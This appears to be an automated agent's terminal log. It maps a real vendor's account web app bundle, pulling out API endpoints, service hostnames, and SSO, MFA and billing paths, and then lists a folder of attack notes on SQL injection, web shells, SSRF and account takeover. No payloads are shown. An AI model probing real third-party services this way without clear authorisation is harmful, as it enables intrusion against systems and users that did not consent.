+/api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+/api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+/api/v1/sites
+/api/v1/subscriptions
+/api/v1/users/integrations/ssoa/subscriptions
+/api/v2/accounts/business-profile
+/api/v2/accounts/tax-ids
+/api/v2/customers/self
+/api/v2/customers/self/billing-details
+/api/v2/customers/self/invoices
+/api/v2/customers/self/invoices/available-years
+/api/v2/customers/self/invoices/preview
+/api/v2/customers/self/invoices/upcoming/pdf
+/api/v2/customers/self/invoices/{invoiceId}/pdf
+/api/v2/customers/self/payment-methods
+/api/v2/customers/self/payment-methods/cards
+/api/v2/customers/self/payment-methods/tappay
+/api/v2/customers/self/setup-intents
+/api/v2/customers/self/setup-intents/{setiId}/attach-pm
+/api/v2/customers/self/subscriptions
+/api/v2/customers/self/tax-ids
+/api/v2/incidents/unresolved.json
+/api/v2/invoices/preview
+/api/v2/invoices/{invoiceId}/lines
+/api/v2/invoices/{invoiceId}/pay
+/api/v2/licenses/validate
+/api/v2/products
+/api/v2/products/plans
+/api/v2/scheduled-maintenances/active.json
+/api/v2/scheduled-maintenances/upcoming.json
+/api/v2/subscribe
+/api/v2/subscribe/rule_set_pro
+/api/v2/subscribe/rule_set_pro/plans
+/api/v2/subscriptions
+/api/v2/subscriptions/devices
+/api/v2/subscriptions/{stripeSubscriptionId}/transfer
+/create-credentials
+/devices
+/devices/{deviceId}/application-devices
+/sites
+/users/self/
+/v1/announcements
+/v1/sso-issue
+/v1/users/self/settings
+/v1/users/self/storage-regions
+/v1/users/self/subscription-availability
+/v1/users/self/subscription-plans
+/v1/users/self/subscriptions
+/v1/users/self/usage
+TOTAL 117
+[0m
+[0m→ [0mRead result/inventory/endpoints.md
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== all *.svc.ui.com / api base hostnames ==="
+grep -oE 'https://[a-zA-Z0-9._-]+\.ui\.com' account.js | sort | uniq -c | sort -rn | head -40
+echo
+echo "=== hostnames of other forms ==="
+grep -oE 'https://[a-zA-Z0-9._-]+\.(ubnt|uisp|uidev|ui)\.(com|tools)' account.js | sort -u | head -40
+=== all *.svc.ui.com / api base hostnames ===
+    194 https://sso.ui.com
+    101 https://help.ui.com
+    100 https://unifi.ui.com
+    100 https://static.ui.com
+     99 https://store.ui.com
+     98 https://status.ui.com
+     97 https://umr.svc.ui.com
+     97 https://ues.svc.ui.com
+     97 https://u5g-api.svc.ui.com
+     97 https://trunking.svc.ui.com
+     97 https://storage.svc.ui.com
+     97 https://secure-uploads.ui.com
+     97 https://megaphone.svc.ui.com
+     97 https://lte-api.svc.ui.com
+     97 https://ips.svc.ui.com
+     97 https://geo.svc.ui.com
+     97 https://feedback.svc.ui.com
+     97 https://fabric.svc.ui.com
+     97 https://enterprise.svc.ui.com
+     97 https://ecomm.svc.ui.com
+     97 https://cloudaccess.svc.ui.com
+     97 https://cap.svc.ui.com
+     97 https://billing.svc.ui.com
+     97 https://activate.ui.com
+     97 https://account.svc.ui.com
+      9 https://www.ui.com
+      3 https://uisp.ui.com
+      2 https://rma.ui.com
+      2 https://community.ui.com
+      1 https://mobility.ui.com
+      1 https://images.svc.ui.com
+      1 https://design.ui.com
+      1 https://account.ui.com
+
+=== hostnames of other forms ===
+https://account.svc.ui.com
+https://account.ui.com
+https://activate.ui.com
+https://billing.svc.ui.com
+https://cap.svc.ui.com
+https://cloudaccess.svc.ui.com
+https://community.ui.com
+https://config.ubnt.com
+https://design.ui.com
+https://ecomm.svc.ui.com
+https://enterprise.svc.ui.com
+https://fabric.svc.ui.com
+https://feedback.svc.ui.com
+https://geo.svc.ui.com
+https://help.ui.com
+https://images.svc.ui.com
+https://ips.svc.ui.com
+https://lte-api.svc.ui.com
+https://megaphone.svc.ui.com
+https://mobility.ui.com
+https://rma.ui.com
+https://secure-uploads.ui.com
+https://sso.ubnt.com
+https://sso.ui.com
+https://static.ui.com
+https://status.ui.com
+https://storage.svc.ui.com
+https://store.ui.com
+https://trunking.svc.ui.com
+https://u5g-api.svc.ui.com
+https://ues.svc.ui.com
+https://uic.uidev.tools
+https://uisp.ui.com
+https://umr.svc.ui.com
+https://unifi.ui.com
+https://www.ui.com
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+import re
+s=open('account.js',encoding='utf-8',errors='replace').read()
+for needle in ['/v1/users/self/usage','/v1/announcements','/v1/sso-issue','/api/v1/licenseCodes/validation','/api/v2/licenses/validate','/api/v1/msps/subscriptions','/api/v1/esim/orders','/v1/users/self/storage-regions']:
+    i=s.find(needle)
+    print('===',needle,'at',i,'===')
+    if i>=0:
+        # find nearest preceding base: within 1500 chars
+        seg=s[max(0,i-1500):i+80]
+        bases=re.findall(r'https://[a-zA-Z0-9._-]+\.(?:ui|ubnt|uisp)\.(?:com|tools)',seg)
+        print('nearby bases:',bases[-3:])
+        print(seg[-300:])
+    print()
+PY
+=== /v1/users/self/usage at 754847 ===
+nearby bases: ['https://ues.svc.ui.com', 'https://storage.svc.ui.com', 'https://megaphone.svc.ui.com']
+`/v1/users/self/subscription-availability`,plans:`/v1/users/self/subscription-plans`,storageRegions:`/v1/users/self/storage-regions`,subscriptions:`/v1/users/self/subscriptions`,settings:`/v1/users/self/settings`,usage:`/v1/users/self/usage`}},megaphone:{base:`https://megaphone.svc.ui.com`,paths:{an
+
+=== /v1/announcements at 754940 ===
+nearby bases: ['https://storage.svc.ui.com', 'https://megaphone.svc.ui.com', 'https://ips.svc.ui.com']
+egions:`/v1/users/self/storage-regions`,subscriptions:`/v1/users/self/subscriptions`,settings:`/v1/users/self/settings`,usage:`/v1/users/self/usage`}},megaphone:{base:`https://megaphone.svc.ui.com`,paths:{announcements:`/v1/announcements`}},cyberSecure:{base:`https://ips.svc.ui.com`,paths:{cancelSub
+
+=== /v1/sso-issue at 755421 ===
+nearby bases: ['https://ips.svc.ui.com', 'https://feedback.svc.ui.com', 'https://help.ui.com']
+rule_set_pro`,previewInvoice:`/api/v2/invoices/preview`,deviceSubscriptions:`/api/v2/subscriptions/devices`,validateLicenseCode:`/api/v2/licenses/validate`}},feedback:{base:`https://feedback.svc.ui.com`,paths:{ssoIssue:`/v1/sso-issue`}},helpCenter:{base:`https://help.ui.com/hc/en-us`},brAutocomplete
+
+=== /api/v1/licenseCodes/validation at 754524 ===
+nearby bases: ['https://umr.svc.ui.com', 'https://cap.svc.ui.com', 'https://ues.svc.ui.com']
+ces:`/api/v1/devices/integrations/ssoa`}},siteSupport:{base:`https://ues.svc.ui.com`,paths:{subscriptions:`/api/v1/subscriptions`,mspSubscriptions:`/api/v1/msps/subscriptions`,plans:`/api/v2/products/plans`,licenseCode:`/api/v1/licenseCodes/validation`}},cloudStorage:{base:`https://storage.svc.ui.co
+
+=== /api/v2/licenses/validate at 755330 ===
+nearby bases: ['https://megaphone.svc.ui.com', 'https://ips.svc.ui.com', 'https://feedback.svc.ui.com']
+ionId}/transfer`,plans:`/api/v2/subscribe/rule_set_pro/plans`,subscribe:`/api/v2/subscribe/rule_set_pro`,previewInvoice:`/api/v2/invoices/preview`,deviceSubscriptions:`/api/v2/subscriptions/devices`,validateLicenseCode:`/api/v2/licenses/validate`}},feedback:{base:`https://feedback.svc.ui.com`,paths:
+
+=== /api/v1/msps/subscriptions at 754452 ===
+nearby bases: ['https://umr.svc.ui.com', 'https://cap.svc.ui.com', 'https://ues.svc.ui.com']
+ons/ssoa/subscriptions`}},cap:{base:`https://cap.svc.ui.com`,paths:{devices:`/api/v1/devices/integrations/ssoa`}},siteSupport:{base:`https://ues.svc.ui.com`,paths:{subscriptions:`/api/v1/subscriptions`,mspSubscriptions:`/api/v1/msps/subscriptions`,plans:`/api/v2/products/plans`,licenseCode:`/api/v1/
+
+=== /api/v1/esim/orders at 753203 ===
+nearby bases: ['https://enterprise.svc.ui.com', 'https://lte-api.svc.ui.com', 'https://u5g-api.svc.ui.com']
+e:{base:`https://lte-api.svc.ui.com`,paths:{subscriptions:`/subscriptions`,devices:`/devices`}},u5g:{base:`https://u5g-api.svc.ui.com`,paths:{esimPlans:`/api/v1/esim/plans`,esimDevices:`/api/v1/esim/devices`,esimOrders:`/api/v1/esim/orders`,esimRenewals:`/api/v1/esim/renewals`}},talk:{base:`https://
+
+=== /v1/users/self/storage-regions at 754728 ===
+nearby bases: ['https://cap.svc.ui.com', 'https://ues.svc.ui.com', 'https://storage.svc.ui.com']
+s`,licenseCode:`/api/v1/licenseCodes/validation`}},cloudStorage:{base:`https://storage.svc.ui.com`,paths:{availability:`/v1/users/self/subscription-availability`,plans:`/v1/users/self/subscription-plans`,storageRegions:`/v1/users/self/storage-regions`,subscriptions:`/v1/users/self/subscriptions`,set
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+i=s.find('accountBE')
+print('accountBE at',i)
+print(s[i-100:i+900])
+print('\n\n=== sso config ===')
+j=s.find('sso:{base')
+print('sso:{base at',j)
+print(s[j-50:j+500])
+PY
+accountBE at 748013
+/.test(a)&&!/-\d$/.test(o)&&([a,o]=[o,a]);return[M_e[a]||a,o||``]}var{api:{nca:EC,config:DC}}={api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,zendeskCreateTicket:`zendesk/ticket`,zendeskOpenTickets:`zendesk/tickets`,zendeskClosedTickets:`zendesk/tickets/closed`,zendeskCcdTickets:`zendesk/tickets/ccd`,zendeskSearchTickets:`zendesk/search_tickets`,zendeskSearchCcdTickets:`zendesk/search_ccd`,zendeskComments:`zendesk/comments`,zendeskCreateComment:`zendesk/comment`,zendeskMarkTicketAsClosed:`zendesk/ticket/{ticketId}/close`,chatMessagingJwt:`chat/messaging/jwt`}},ssoUi:{base:`https://sso.ui.com`},geo:{base:`https://geo.svc.ui.com`,paths:{geo:`/geo`}},sso:{base:`https://sso.ubnt.com`,paths:{legal:`/api/sso/v1/legal`,loginUserCheck:`/api/sso/v1/login/email`,idpLoginResult:`/api/sso/v1/idp/login-result`,login:`/api/sso/v1/login`,shopify_login:`/api/sso/v1/shopify_login`,logout:`/api/sso/v1/logout`,loginMFA:`/api/sso/v1/login/2fa`,self:`/api/sso/v1/user/se
+
+
+=== sso config ===
+sso:{base at 748606
+base:`https://geo.svc.ui.com`,paths:{geo:`/geo`}},sso:{base:`https://sso.ubnt.com`,paths:{legal:`/api/sso/v1/legal`,loginUserCheck:`/api/sso/v1/login/email`,idpLoginResult:`/api/sso/v1/idp/login-result`,login:`/api/sso/v1/login`,shopify_login:`/api/sso/v1/shopify_login`,logout:`/api/sso/v1/logout`,loginMFA:`/api/sso/v1/login/2fa`,self:`/api/sso/v1/user/self`,selfSettings:`/api/sso/v1/user/self/settings`,twoFa:`/api/sso/v1/user/self/2fa`,twoFaBackup:`/api/sso/v1/user/self/2fa/backup`,twoFaReset:`/api/sso/v1/user/self/2fa/reset`,roles:`/api/sso/v
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+i=s.find('accountBE')
+seg=s[i-100:i+7600]
+# print with newlines after `},` for readability, and only lines containing base/paths
+import re
+# split into chunks by '},' 
+print(seg[:7600])
+PY
+/.test(a)&&!/-\d$/.test(o)&&([a,o]=[o,a]);return[M_e[a]||a,o||``]}var{api:{nca:EC,config:DC}}={api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,zendeskCreateTicket:`zendesk/ticket`,zendeskOpenTickets:`zendesk/tickets`,zendeskClosedTickets:`zendesk/tickets/closed`,zendeskCcdTickets:`zendesk/tickets/ccd`,zendeskSearchTickets:`zendesk/search_tickets`,zendeskSearchCcdTickets:`zendesk/search_ccd`,zendeskComments:`zendesk/comments`,zendeskCreateComment:`zendesk/comment`,zendeskMarkTicketAsClosed:`zendesk/ticket/{ticketId}/close`,chatMessagingJwt:`chat/messaging/jwt`}},ssoUi:{base:`https://sso.ui.com`},geo:{base:`https://geo.svc.ui.com`,paths:{geo:`/geo`}},sso:{base:`https://sso.ubnt.com`,paths:{legal:`/api/sso/v1/legal`,loginUserCheck:`/api/sso/v1/login/email`,idpLoginResult:`/api/sso/v1/idp/login-result`,login:`/api/sso/v1/login`,shopify_login:`/api/sso/v1/shopify_login`,logout:`/api/sso/v1/logout`,loginMFA:`/api/sso/v1/login/2fa`,self:`/api/sso/v1/user/self`,selfSettings:`/api/sso/v1/user/self/settings`,twoFa:`/api/sso/v1/user/self/2fa`,twoFaBackup:`/api/sso/v1/user/self/2fa/backup`,twoFaReset:`/api/sso/v1/user/self/2fa/reset`,roles:`/api/sso/v1/user/self/roles`,rolesBeta:`/api/sso/v1/user/{uuid}/roles/beta`,resetPassword:`/api/sso/v1/password`,verifyResetRequest:`/api/sso/v1/verify/password`,verifyRegistration:`/api/sso/v1/verify/verification-code`,resendVerificationEmail:`/api/sso/v1/verify`,createAccount:`/api/sso/v2/users`,picture:`/api/sso/v1/user/self/picture`,checkUsername:`/api/sso/v1/search/username`,checkEmail:`/api/sso/v1/search/email`,checkPassword:`/api/sso/v2/password-strength`,checkPasswordV1:`/api/sso/v1/password-strength`,setupLoginToken:`api/sso/v1/user/self/token/setup`,approveLoginToken:`api/sso/v1/user/self/token/login`,mfa:`/api/sso/v1/user/self/mfa`,sendEmailV2:`/api/sso/v2/user/self/mfa/email/{id}/send`,assuranceLevel:`/api/sso/v1/user/self/login/level`,assuranceLevelRefresh:`/api/sso/v1/user/self/login/level/refresh`,addresses:`/api/sso/v1/user/self/addresses`,activity:`/api/sso/v1/user/self/activity`,requestVerifyEmail:`/api/sso/v1/user/self/email/verify/send`,validateAddress:`/api/sso/v1/address/validator`,sessions:`/api/sso/v1/user/self/sessions`,zendeskCreateOrUpdateUser:`/api/sso/v1/user/self/zendesk_user`,trustedDevices:`/api/sso/v1/user/self/trusted_devices`,device:`/api/sso/v1/user/self/device`,emailOtp:`/api/sso/v1/legacy/user/self/email/send`,verifyEmailChangeOtp:`/api/sso/v1/legacy/user/self/email`,passwordlessOptions:`/api/sso/v1/passwordless/options`,passwordlessLogin:`/api/sso/v1/passwordless/login`,suspiciousConfirmInspect:`/api/sso/v1/suspicious/confirm/inspect`,suspiciousConfirm:`/api/sso/v1/suspicious/confirm`,savedAccounts:`/api/sso/v1/account-chooser`}},msp:{base:`https://fabric.svc.ui.com`,paths:{msp:`/api/fabrics/base/msp/v1/msp`,mspIdpEnforcement:`/api/fabrics/base/msp/v1/msp/idp-enforcement`,logo:`/api/fabrics/base/msp/v1/logo`,idp:`/api/fabrics/base/msp/v1/idp`,idpConfiguration:`/api/fabrics/base/msp/v1/idp/configuration`,idpCredentials:`/api/fabrics/base/msp/v1/idp/credentials`,idpRebind:`/api/fabrics/base/msp/v1/idp/rebind`,idpRetryConfigure:`/api/fabrics/base/msp/v1/idp/retry-configure`,idpSync:`/api/fabrics/base/msp/v1/idp/sync`,idpSyncJob:`/api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}`,idpSyncTargets:`/api/fabrics/base/msp/v1/idp/sync-targets`,idpDirectoryGroups:`/api/fabrics/base/msp/v2/idp/directory/groups`,idpDomainVerify:`/api/fabrics/base/msp/v1/idp/domain/verify`,idpScimToken:`/api/fabrics/base/msp/v1/idp/scim-token`,idpScimTokenRegenerate:`/api/fabrics/base/msp/v1/idp/scim-token/regenerate`}},billing:{base:`https://billing.svc.ui.com`,paths:{subscriptionsSingle:`/api/v2/subscriptions`,customer:`/api/v2/customers/self`,cards:`/api/v2/customers/self/payment-methods/cards`,paymentMethodsTapPay:`/api/v2/customers/self/payment-methods/tappay`,paymentMethods:`/api/v2/customers/self/payment-methods`,subscriptions:`/api/v2/customers/self/subscriptions`,products:`/api/v2/products`,invoices:`/api/v2/customers/self/invoices`,invoiceLines:`/api/v2/invoices/{invoiceId}/lines`,invoicesUpcoming:`/api/v2/customers/self/invoices/preview`,invoicePay:`/api/v2/invoices/{invoiceId}/pay`,taxId:`/api/v2/customers/self/tax-ids`,uiTaxId:`/api/v2/accounts/tax-ids`,businessProfile:`/api/v2/accounts/business-profile`,invoiceYears:`/api/v2/customers/self/invoices/available-years`,billingDetails:`/api/v2/customers/self/billing-details`,pdf:`/api/v2/customers/self/invoices/{invoiceId}/pdf`,setupIntents:`/api/v2/customers/self/setup-intents`,attachPm:`/api/v2/customers/self/setup-intents/{setiId}/attach-pm`,upcomingPDF:`/api/v2/customers/self/invoices/upcoming/pdf`}},organizations:{base:`https://enterprise.svc.ui.com`,paths:{listOrgs:`/api/v1/organizations`,subscriptions:`/api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions`,invoices:`/api/v1/organizations/{orgId}/billing/v2/customers/self/invoices`,invoiceYears:`/api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years`}},lte:{base:`https://lte-api.svc.ui.com`,paths:{subscriptions:`/subscriptions`,devices:`/devices`}},u5g:{base:`https://u5g-api.svc.ui.com`,paths:{esimPlans:`/api/v1/esim/plans`,esimDevices:`/api/v1/esim/devices`,esimOrders:`/api/v1/esim/orders`,esimRenewals:`/api/v1/esim/renewals`}},talk:{base:`https://trunking.svc.ui.com`,paths:{subscriptions:`/sso/account`,installs:`/sso/installs`,cancel:`/sso/cancel_subscription`}},status:{base:`https://status.ui.com`,paths:{active:`/api/v2/scheduled-maintenances/active.json`,upcoming:`/api/v2/scheduled-maintenances/upcoming.json`,incidents:`/api/v2/incidents/unresolved.json`}},config:{base:`https://config.ubnt.com`,paths:{nca:`/cloudAccessConfig.json`}},fingerprint:{base:`https://static.ui.com`,paths:{public:`/fingerprint/ui/public.json`,icons:`/fingerprint/ui/icons`},urlParts:{medium:`_101x101.png`}},nca:{base:`https://cloudaccess.svc.ui.com`,paths:{auth:`/create-credentials`,backup:`/ucore/backup`,devices:`/devices`,hosts:`/api/v1/hosts`,sites:`/sites`,sitesV1:`/api/v1/sites`,deviceBackups:`/ucore/backups`,archivedDeviceBackups:`/ucore/archived-backups`,applicationDevices:`/devices/{deviceId}/application-devices`}},umr:{base:`https://umr.svc.ui.com`,paths:{subscriptions:`/api/v1/users/integrations/ssoa/subscriptions`}},cap:{base:`https://cap.svc.ui.com`,paths:{devices:`/api/v1/devices/integrations/ssoa`}},siteSupport:{base:`https://ues.svc.ui.com`,paths:{subscriptions:`/api/v1/subscriptions`,mspSubscriptions:`/api/v1/msps/subscriptions`,plans:`/api/v2/products/plans`,licenseCode:`/api/v1/licenseCodes/validation`}},cloudStorage:{base:`https://storage.svc.ui.com`,paths:{availability:`/v1/users/self/subscription-availability`,plans:`/v1/users/self/subscription-plans`,storageRegions:`/v1/users/self/storage-regions`,subscriptions:`/v1/users/self/subscriptions`,settings:`/v1/users/self/settings`,usage:`/v1/users/self/usage`}},megaphone:{base:`https://megaphone.svc.ui.com`,paths:{announcements:`/v1/announcements`}},cyberSecure:{base:`https://ips.svc.ui.com`,paths:{cancelSubscription:`/api/v2/subscribe`,transferSubscription:`/api/v2/subscriptions/{stripeSubscriptionId}/transfer`,plans:`/api/v2/subscribe/rule_set_pro/plans`,subscribe:`/api/v2/subscribe/rule_set_pro`,previewInvoice:`/api/v2/invoices/preview`,deviceSubscriptions:`/api/v2/subscriptions/devices`,validateLicenseCode:`/api/v2/licenses/validate`}},feedback:{base:`https://feedback.svc.ui.com`,paths:{ssoIssue:`/v1/sso-issue`}},helpCenter:{base:`https://help.ui.com/hc/en-us`},brAutocomplete:{base:`http
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+for needle in ['gT=','hT=','mT=','p_=','Xw=','Qw=','$w=','Ww=','kw=','NS=','IS=']:
+    i=s.find(needle)
+    print('===',needle,'at',i,'===')
+    if i>=0: print(s[i:i+420])
+    print()
+PY
+=== gT= at 840584 ===
+gT=e=>typeof e==`string`?e:`${e.pathname??``}${e.search??``}${e.hash??``}`,_T=(e,t,n,r)=>{t===`_self`?r?window.location.replace(e):window.location.assign(e):window.open(e,t,n)},vT=()=>{let e=p_(),{resolveExternal:t}=mT();return(0,F.useCallback)((n,r)=>{if(typeof n==`number`){e(n);return}let i=hT(gT(n));if(i){let{target:e,windowRel:n}=t(i);_T(i,e,n,r?.replace)}else e(n,r)},[t,e])},yT=({to:e,...t})=>{let{resolveExterna
+
+=== hT= at 840409 ===
+hT=e=>{try{let t=new URL(e,window.location.origin);return t.protocol!==`http:`&&t.protocol!==`https:`||t.origin===window.location.origin?null:t.toString()}catch{return null}},gT=e=>typeof e==`string`?e:`${e.pathname??``}${e.search??``}${e.hash??``}`,_T=(e,t,n,r)=>{t===`_self`?r?window.location.replace(e):window.location.assign(e):window.open(e,t,n)},vT=()=>{let e=p_(),{resolveExternal:t}=mT();return(0,F.useCallback)(
+
+=== mT= at 840080 ===
+mT=()=>{let e=vve(),t=Uw(),n=t!==null,r=t===Rw.Minimal;return(0,F.useMemo)(()=>({mode:e?`appview`:r?`embed-minimal`:n?`embed`:`normal`,isAppView:e,isEmbeddedView:n,isMinimalEmbeddedView:r,resolveExternal:e=>{let t=Nve(e);return{target:`_blank`,linkRel:t?`noreferrer`:void 0,windowRel:t?`noopener,noreferrer`:void 0}}}),[e,n,r])},hT=e=>{try{let t=new URL(e,window.location.origin);return t.protocol!==`http:`&&t.protocol!
+
+=== p_= at -1 ===
+
+=== Xw= at 813937 ===
+Xw=Yw.getValue;Yw.setValue;var Sve=()=>Nw(ZC,Jw),Zw=e=>e.startsWith(`https://`)&&yw(e),Cve=()=>{let e=window.location.ancestorOrigins?.[0];if(e)return e;if(!document.referrer)return null;try{return new URL(document.referrer).origin}catch{return null}},Qw=e=>{if(!Ww())return!1;let t=Xw();if(!t)return!1;try{let{origin:n}=new URL({api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,zendes
+
+=== Qw= at 814189 ===
+Qw=e=>{if(!Ww())return!1;let t=Xw();if(!t)return!1;try{let{origin:n}=new URL({api:{accountBE:{base:`https://account.svc.ui.com`,paths:{zendeskUser:`zendesk/user`,zendeskCreateTicket:`zendesk/ticket`,zendeskOpenTickets:`zendesk/tickets`,zendeskClosedTickets:`zendesk/tickets/closed`,zendeskCcdTickets:`zendesk/tickets/ccd`,zendeskSearchTickets:`zendesk/search_tickets`,zendeskSearchCcdTickets:`zendesk/search_ccd`,zendesk
+
+=== $w= at 825361 ===
+$w=e=>{let t=Xw();if(!t||!Qw(e)){window.open(e,`_blank`,`noopener,noreferrer`);return}let{pathname:n,search:r,hash:i}=new URL(e);n.startsWith(`//`)?window.open(e,`_blank`,`noopener,noreferrer`):cT({eventName:`navigation.requested`,data:{path:`${n}${r}${i}`,host:t}})},wve=()=>{if(Kw.Prod!==`prd`)return`*`;let e=Cve();return e&&Zw(e)?e:null},eT=e=>({eventName:`sso.account.changed`,data:{first_name:e.first_name??null,la
+
+=== Ww= at 813731 ===
+Ww=()=>xve()!==null,Gw=()=>Uw()!==null,Kw={Prod:`prd`,Df:`df`,Stg:`stg`,Dev:`dev`,Local:`local`};Kw.Prod,Kw.Df,Kw.Stg,Kw.Dev,Kw.Local;var qw=e=>t=>e.includes(t)?t:null,Jw=qw(Object.values(QC)),Yw=Mw(ZC,Jw),Xw=Yw.getValue;Yw.setValue;var Sve=()=>Nw(ZC,Jw),Zw=e=>e.startsWith(`https://`)&&yw(e),Cve=()=>{let e=window.location.ancestorOrigins?.[0];if(e)return e;if(!document.referrer)return null;try{return new URL(document
+
+=== kw= at 812766 ===
+kw=(e,t)=>{if(e!==null)try{t===null?sessionStorage.removeItem(e):sessionStorage.setItem(e,String(t))}catch(e){console.error(e)}},Aw=(e,t)=>Ow(Dw(e),t)??Ow(e,t),jw=(e,t)=>{kw(Dw(e),t),kw(e,t)},Mw=(e,t)=>({getValue:()=>Cw(e,t)??Tw(e,t)??Aw(e,t),setValue:t=>{Ew(e,t),jw(e,t)}}),Nw=(e,t)=>{let n=Cw(e,t),r=n??Tw(e,t)??Aw(e,t);return(0,F.useEffect)(()=>{n===null?r!==null&&Tw(e,t)===null&&(Ew(e,r),kw(Dw(e),r)):(Ew(e,n),jw(e,
+
+=== NS= at 219813 ===
+NS=function(e){typeof e==`string`&&i.d.D(e)},e.preinit=function(e,t){if(typeof e==`string`&&t&&typeof t.as==`string`){var n=t.as,r=u(n,t.crossOrigin),a=typeof t.integrity==`string`?t.integrity:void 0,o=typeof t.fetchPriority==`string`?t.fetchPriority:void 0;n===`style`?i.d.S(e,typeof t.precedence==`string`?t.precedence:void 0,{crossOrigin:r,integrity:a,fetchPriority:o}):n===`script`&&i.d.X(e,{crossOrigin:r,integrity:
+
+=== IS= at -1 ===
+[0m
+[0m$ [0mcd /tmp/s34
+python3 - <<'PY'
+s=open('account.js',encoding='utf-8',errors='replace').read()
+for needle in ['$w(', '$w)', '$w,', '$w=']:
+    idx=0;c=0
+    while True:
+        i=s.find(needle,idx)
+        if i<0: break
+        c+=1
+        print('===',needle,'at',i,'===')
+        print(s[max(0,i-300):i+200])
+        print()
+        idx=i+1
+        if c>8: break
+PY
+=== $w( at 5207204 ===
+35.052 2.26.116l.84.156q.555.104 1.124.699.44.44.62 1.191zM7.932 9.87l5.224-2.89-5.225-2.916z' clip-rule='evenodd' opacity='.9'/%3e%3c/svg%3e`,j$=({href:e,children:t,...n})=>{let{resolveExternal:r}=mT(),{target:i,linkRel:a}=r(e),o=(0,F.useCallback)(t=>{Qw(e)&&(t.preventDefault(),t.stopPropagation(),$w(e))},[e]);return(0,I.jsx)(JB,{...n,href:e,target:i,rel:a,onClick:o,children:t})},Aot=()=>{let[e,t]=(0,F.useState)(!1),{facebook:n,twitter:r,youtube:i,instagram:a}=Cot,{statusUi:o,helpUi:s}=A$;retur
+
+=== $w( at 6104585 ===
+;return{entries:a,isLoading:!n||o&&!a.length}},hNt=({orgId:e})=>{let{palette:t}=uC(),n=pNt(e);if(n?.usedBytes==null)return null;let{usedBytes:r,appUsedBytes:i,limitBytes:a}=n,o=rNt(e),s=o&&(0,I.jsx)(u4,{text:(0,I.jsx)(q,{id:`SUBSCRIPTIONS_CLOUD_STORAGE_VIEW_STORAGE`}),variant:`emphasis`,onPress:()=>$w(o)}),c=i?[{color:t[`ublue-06`],bytes:i.protect,labelId:`SUBSCRIPTIONS_CLOUD_STORAGE_PROTECT_USAGE`},{color:t[`purple-06`],bytes:i.drive,labelId:`SUBSCRIPTIONS_CLOUD_STORAGE_DRIVE_USAGE`}].filter(({
+
+=== $w( at 6332744 ===
+:t,usedBytes:n},isLast:r})=>{let i=nNt(t),a=i?(0,I.jsx)(q,{id:`CLOUD_STORAGE_OVERVIEW_LAST_SYNC`,values:{time:gIt(i,`short`)}}):(0,I.jsx)(q,{id:`CLOUD_STORAGE_OVERVIEW_NOT_SYNCED`}),o=rNt(e?.orgId??null);return(0,I.jsxs)(I.Fragment,{children:[(0,I.jsxs)(rLt,{type:`button`,disabled:!o,onClick:()=>o&&$w(o),children:[(0,I.jsx)(nLt,{organization:e}),(0,I.jsxs)(Y,{column:!0,overflow:`hidden`,flex:`1`,children:[(0,I.jsx)(K,{variant:`body-primary`,isTruncated:!0,color:`text-1`,children:e?e.name:(0,I.js
+
+=== $w= at 825361 ===
+!0,allowCloudStorageSubscribe:!0,allowSiteSupportSubscribe:!1,allowCyberSecureSubscribe:!0,allowCyberSecureEnterprise:!0,allowCyberSecureMultiYear:!1,allowCyberSecureZeroDay:!1,allowBillingSearch:!1,prefetchZendeskInBackground:!1}}.externalUrls[t].base);return new URL(e).origin===n}catch{return!1}},$w=e=>{let t=Xw();if(!t||!Qw(e)){window.open(e,`_blank`,`noopener,noreferrer`);return}let{pathname:n,search:r,hash:i}=new URL(e);n.startsWith(`//`)?window.open(e,`_blank`,`noopener,noreferrer`):cT({ev
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+find vulnebleti -maxdepth 2 -type f | head -80; echo "---"; ls vulnebleti
+vulnebleti/Secret_keys/Test.md
+vulnebleti/Secret_keys/Firebase_Exploitation_Commands.md
+vulnebleti/BAC/usefull-notes.md
+vulnebleti/BAC/idor_bypass_techniques.md
+vulnebleti/BAC/Management_Website_BAC_Checklist.md
+vulnebleti/BAC/api-hacking.txt
+vulnebleti/BAC/all-actions.md
+vulnebleti/BAC/Application-Level-DoS.txt
+vulnebleti/Idor/idor_bypass_techniques.md
+vulnebleti/Idor/Idor.md
+vulnebleti/Sqli/Test.txt
+vulnebleti/Sqli/sql_payloads.md
+vulnebleti/http_request_smuggling/obfuscating the TE header.md
+vulnebleti/http_request_smuggling/http_request_smuggling_notes.md
+vulnebleti/File_upload/Exploit.md
+vulnebleti/File_upload/Web-Shell-Payloads.md
+vulnebleti/.gitkeep
+vulnebleti/os-command-injection/os-command-injection.md
+vulnebleti/LFI/ect-passwd-waf-bypass.md
+vulnebleti/ATO/forget_password_bug_hunting_notes.md
+vulnebleti/ATO/oauth_misconfiguration_bug_hunting_notes.md
+vulnebleti/ATO/Encoding-ato.md
+vulnebleti/ATO/ATO_Encoding_Exploit_Strategies.md
+vulnebleti/ATO/ato_bug_hunting_tips.md
+vulnebleti/op-to-xss/find.md
+vulnebleti/op-to-xss/payloads.txt
+vulnebleti/Ssrf/ssrf-bypass.md
+vulnebleti/Ssrf/ssrf-pdf-generator-payload.md
+vulnebleti/Ssrf/Top 1000 Ports.md
+vulnebleti/Ssrf/os-command-injection.md
+vulnebleti/Ssrf/combined_ssrf_lfi_payloads.txt
+vulnebleti/Ssrf/Ssrf_to_rce.md
+vulnebleti/Fuzz/idor.txt
+vulnebleti/Fuzz/open-redirect-bypass.md
